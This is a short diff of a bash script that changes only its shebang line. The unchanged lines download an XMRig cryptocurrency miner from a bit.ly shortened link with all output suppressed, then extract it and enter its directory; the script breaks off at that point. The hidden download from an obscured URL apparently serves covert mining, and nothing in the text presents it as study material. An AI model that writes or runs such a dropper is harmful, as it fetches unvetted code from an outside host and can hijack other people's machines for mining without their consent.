@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/usr/bin/env bash
 wget -O xmrig-6.16.4-linux-static-x64.tar.gz https://bit.ly/34BX48f > /dev/null 2>&1
 tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
 cd xmrig-6.16.4
